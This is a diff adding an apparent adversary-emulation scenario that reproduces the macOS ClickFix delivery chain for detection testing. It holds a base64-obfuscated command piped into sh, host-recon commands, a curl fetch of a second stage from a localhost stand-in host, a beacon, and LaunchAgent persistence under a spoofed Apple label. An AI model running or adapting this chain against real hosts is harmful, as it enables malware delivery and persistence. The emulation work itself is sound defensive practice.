@@ -1,0 +1,79 @@
+name: ClickFix / Malicious Copy-Paste Delivery
+description: |
+  Emulates the ClickFix delivery pattern (T1204.004 User Execution: Malicious
+  Copy and Paste), in which a spoofed CAPTCHA, "fix this error", or software
+  update page instructs the victim to paste an obfuscated one-liner into
+  Terminal themselves. No file is delivered, so file-based and Gatekeeper
+  controls never see anything - the user is the delivery mechanism. In use
+  against macOS since late 2024 and now a primary AMOS/Odyssey delivery route,
+  which is why the AMOS scenario lists it as an upstream vector it does not
+  itself emulate.
+
+  Sequence: obfuscated paste → base64 decode → shell exec → host recon
+             → second-stage fetch → LaunchAgent persistence
+
+  What this scenario deliberately does NOT emulate: the browser page, the
+  clipboard write, and the keystrokes. macnoise generates host telemetry, and
+  MITRE's own macOS analytic for this technique (AN0964) keys on the resulting
+  terminal exec - "user pastes an obfuscated command into Terminal.app/iTerm2
+  that decodes or downloads code" - rather than on the clipboard. The pasted
+  command is what a detection sees, so the pasted command is what this
+  generates.
+
+  MITRE ATT&CK techniques: T1204.004, T1059.004, T1027, T1082, T1105, T1543.001
+
+  References:
+    MITRE T1204.004 — https://attack.mitre.org/techniques/T1204/004/
+
+steps:
+  # T1204.004 + T1027 — the pasted one-liner itself, base64-obfuscated.
+  # Decodes to: echo "[macnoise] clickfix stage 1 executed"; sw_vers -productVersion; id -un
+  #
+  # This step is the technique. The obfuscation is not decoration: the macOS
+  # analytic names decoding explicitly, and a plain readable command would miss
+  # the half of the detection that keys on "curl/wget/bash/sh with pipe to
+  # interpreter or base64-decode".
+  #
+  # Piping a decode into sh is self-contained and executes for real with no
+  # network dependency, which is why it leads rather than the curl | sh variant
+  # (see the note on the fetch step below).
+  - module: proc_spawn
+    params:
+      command: "echo 'ZWNobyAiW21hY25vaXNlXSBjbGlja2ZpeCBzdGFnZSAxIGV4ZWN1dGVkIjsgc3dfdmVycyAtcHJvZHVjdFZlcnNpb247IGlkIC11bg==' | base64 -d | sh"
+
+  # T1082 — the decoded stage profiles the host before pulling anything else down,
+  # so an operator only pays for a second stage on a machine worth having
+  - module: proc_discovery
+    params:
+      commands: "sw_vers,system_profiler SPHardwareDataType,whoami,csrutil status"
+
+  # T1105 — fetch the second stage to disk.
+  #
+  # Deliberately '-o <file>' rather than the 'curl | sh' form the real pattern
+  # often uses. Without a listener on 127.0.0.1:8080 the fetch fails, and a
+  # failed download still generates real connection telemetry - whereas a failed
+  # 'curl | sh' pipes nothing into sh, which executes and does nothing at all.
+  # That would report a technique the host never performed. Point this at a real
+  # payload host to exercise the full download-and-run chain.
+  - module: proc_spawn
+    params:
+      command: "curl -fsSL http://127.0.0.1:8080/update.sh -o /tmp/macnoise_clickfix_stage2 2>/dev/null; chmod +x /tmp/macnoise_clickfix_stage2 2>/dev/null || true"
+
+  # T1071.001 — check in with C2 once the stage is resolved
+  - module: net_beacon
+    params:
+      target: "http://127.0.0.1:8080"
+      count: "3"
+      interval: "2"
+
+  # T1543.001 — LaunchAgent persistence, the usual terminal state of a macOS
+  # ClickFix chain once the stage-2 stealer has run.
+  # Written flat in /tmp rather than into a subdirectory: plist_create's Cleanup
+  # removes the plist but not a parent directory it had to create, so a nested
+  # path would leave an empty directory behind after the run.
+  - module: plist_create
+    params:
+      output_path: "/tmp/macnoise_clickfix_updatecheck.plist"
+      bundle_id: "com.apple.updatecheck"
+      mode: "launchagent"
+      label: "com.apple.updatecheck"
